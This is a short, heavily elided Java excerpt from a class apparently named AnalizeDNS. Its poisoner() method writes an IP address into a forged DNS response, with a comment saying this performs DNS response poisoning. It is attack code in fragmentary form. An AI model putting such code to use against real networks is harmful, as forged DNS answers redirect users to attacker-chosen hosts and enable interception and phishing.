...
public class AnalizeDNS {
	...
	public void poisoner() {
		...
		payload_FORGED[c + 17] = IP_h2h[0]; // Perform DNS response poisoning...
		payload_FORGED[c + 18] = IP_h2h[1];
		payload_FORGED[c + 19] = IP_h2h[2];
		payload_FORGED[c + 20] = IP_h2h[3];
